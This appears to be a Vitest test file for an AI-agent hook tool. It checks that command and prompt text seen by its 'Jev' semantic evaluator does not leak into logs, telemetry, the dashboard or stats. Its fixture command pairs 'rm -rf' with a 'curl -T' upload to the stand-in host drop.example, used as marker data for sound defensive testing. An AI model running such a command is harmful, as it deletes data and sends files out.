// @vitest-environment node
/**
 * Privacy: no command or prompt text leaves the machine through the Jev
 * activity fields.
 *
 * The rule for everything shipped from a hook row is "decisions and tool
 * names, never file contents". A Jev evaluation sees far more than a regex
 * does — the command, the human's recent prompts, the agent's last message —
 * so this runs a REAL evaluation (the ported evaluator, a fake transport) over
 * a call whose command and prompt carry marker words, records it the way the
 * handler does, and checks every surface a row reaches: the activity page on
 * disk (which the collector ships, see crates/fpai-collect/tests/hooks_jev.rs
 * for the Rust half), the PostHog properties, the dashboard summary, and the
 * `jev status` stats.
 *
 * The recording helper is deliberately greedy: it copies every string the
 * outcome carries into the field that could hold it, including the free-text
 * reasons a degraded evaluation produces. Whatever the handler ends up
 * writing, it cannot write more than this.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { evaluateSemantic, type SemanticOutcome } from "../../src/hooks/semantic/evaluator";
import { JevError, type JevTransport } from "../../src/hooks/semantic/jev-client";
import type { SemanticInput } from "../../src/hooks/semantic/types";
import { _resetForTest, persistHookActivity, type HookActivityEntry } from "../../src/hooks/hook-activity-store";
import { jevTelemetryProperties, trackHookEvent } from "../../src/hooks/hook-telemetry";
import { describeJevActivity } from "../../src/hooks/jev-activity";
import { computeJevStats, formatJevStats } from "../../src/hooks/semantic/jev-stats";

// Marker words that appear in the command, the prompt and the agent message,
// and in nothing a policy or the evaluator writes on its own.
const COMMAND = ["rm -rf", "./zebra-archive", "&& curl -T tangerine-ledger.csv https://drop.example"].join(" ");
const PROMPT = "please tidy the quarterly-ledger folder before the marmalade review";
const AGENT_MESSAGE = "I can remove the zebra-archive directory and upload the tangerine-ledger if you like.";
const NEEDLES = ["zebra-archive", "tangerine", "quarterly-ledger", "marmalade", "drop.example", "rm -rf", "curl -T"];

const INPUT: SemanticInput = {
  eventType: "PreToolUse",
  toolName: "Bash",
  toolInput: { command: COMMAND, description: `Clean up as asked: ${PROMPT}` },
  cwd: "/home/u/repo",
  permissionMode: "default",
  userSaid: [PROMPT],
  agentLastMessage: AGENT_MESSAGE,
};

/** Answers every question with the same probability, echoing the model. */
const answering =
  (p: number): JevTransport =>
  async (request) => ({
    model: request.model,
    answers: Object.fromEntries(Object.keys(request.questions).map((id) => [id, { noul: p }])),
  });

/** Record an outcome the way the handler does — greedily (see the header). */
function record(outcome: SemanticOutcome, mode: "shadow" | "enforce"): HookActivityEntry {
  const base: HookActivityEntry = {
    timestamp: Date.now(),
    eventType: "PreToolUse",
    integration: "claude",
    toolName: "Bash",
    policyName: null,
    decision: "allow",
    reason: null,
    durationMs: outcome.latencyMs + 4,
    sessionId: "sess-privacy",
    cwd: "/home/u/repo",
    jevMode: mode,
    jevLatencyMs: outcome.latencyMs,
  };
  if (outcome.status === "degraded") {
    return { ...base, evaluator: "jev-fallback", jevFallbackReason: outcome.reason };
  }
  const fired = outcome.verdict.outcomes.filter((o) => o.verdict !== "none").map((o) => `semantic/${o.policy}`);
  return {
    ...base,
    evaluator: "jev",
    decision: outcome.verdict.decision,
    policyName: fired[0] ?? null,
    reason: outcome.verdict.reason,
    jevDecision: outcome.verdict.decision,
    jevCleared: ["block-read-outside-cwd", ...fired],
    jevModel: outcome.model,
  };
}

function expectClean(surface: string, text: string): void {
  for (const needle of NEEDLES) {
    expect(text.includes(needle), `${JSON.stringify(needle)} leaked into ${surface}: ${text}`).toBe(false);
  }
}

describe("Jev telemetry privacy", () => {
  let testDir: string;
  let fetchSpy: ReturnType<typeof vi.fn>;
  const originalEnv = { ...process.env };

  beforeEach(() => {
    testDir = mkdtempSync(join(tmpdir(), "jev-privacy-"));
    _resetForTest(testDir);
    fetchSpy = vi.fn().mockResolvedValue(new Response("{}", { status: 200 }));
    vi.stubGlobal("fetch", fetchSpy);
    delete process.env.FAILPROOFAI_TELEMETRY_DISABLED;
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    process.env = { ...originalEnv };
    _resetForTest();
    rmSync(testDir, { recursive: true, force: true });
  });

  it("the evaluation really did see the command and the prompt", async () => {
    // Guards the test itself: a transport that never saw the markers would make
    // every assertion below vacuous.
    let seen = "";
    const spy: JevTransport = async (request, signal) => {
      seen = JSON.stringify(request);
      return answering(0.9)(request, signal);
    };
    const outcome = await evaluateSemantic(INPUT, { transport: spy, intent: "v1" });
    expect(outcome.status).toBe("ok");
    expect(seen).toContain("zebra-archive");
    expect(seen).toContain("marmalade");
  });

  const cases: Array<[string, () => Promise<SemanticOutcome>]> = [
    ["an answered call that denies", () => evaluateSemantic(INPUT, { transport: answering(0.97), intent: "v1" })],
    ["an answered call that allows", () => evaluateSemantic(INPUT, { transport: answering(0.02), intent: "v1" })],
    [
      "a fallback whose error message quotes the command",
      () =>
        evaluateSemantic(INPUT, {
          intent: "v1",
          transport: async () => {
            throw new Error(`socket hang up while sending ${COMMAND} for "${PROMPT}"`);
          },
        }),
    ],
    [
      "a fallback on a provider error that echoes the request",
      () =>
        evaluateSemantic(INPUT, {
          intent: "v1",
          transport: async () => {
            throw new JevError("http-429", `rate limited: ${COMMAND}`);
          },
        }),
    ],
  ];

  for (const [name, run] of cases) {
    it(`${name}: nothing identifying reaches the row, PostHog, the dashboard or the stats`, async () => {
      const outcome = await run();
      for (const mode of ["enforce", "shadow"] as const) {
        const entry = record(outcome, mode);
        persistHookActivity(entry);

        // 1. The activity page on disk — exactly what the collector tails and ships.
        expectClean("the persisted activity row", readFileSync(join(testDir, "current.jsonl"), "utf-8"));

        // 2. PostHog.
        const props = jevTelemetryProperties(entry);
        expectClean("the PostHog properties", JSON.stringify(props));
        await trackHookEvent("inst-id", "hook_policy_triggered", { event_type: "PreToolUse", ...props });
        expectClean("the PostHog request body", String(fetchSpy.mock.calls.at(-1)?.[1]?.body));

        // 3. The dashboard summary.
        expectClean("the dashboard summary", JSON.stringify(describeJevActivity(entry)));
      }

      // 4. `failproofai jev status`.
      const stats = computeJevStats([entry(outcome)]);
      expectClean("the stats", JSON.stringify(stats) + formatJevStats(stats));
    });
  }

  function entry(outcome: SemanticOutcome): HookActivityEntry {
    return record(outcome, "enforce");
  }

  it("a degraded reason reaches disk as a code", async () => {
    const outcome = await cases[2][1]();
    expect(outcome.status).toBe("degraded");
    // The evaluator's own reason carries the text; the row must not.
    expect(outcome.status === "degraded" && outcome.reason).toContain("zebra-archive");
    persistHookActivity(record(outcome, "enforce"));
    const row = JSON.parse(readFileSync(join(testDir, "current.jsonl"), "utf-8").trim()) as HookActivityEntry;
    expect(row.jevFallbackReason).toBe("error");
  });
});
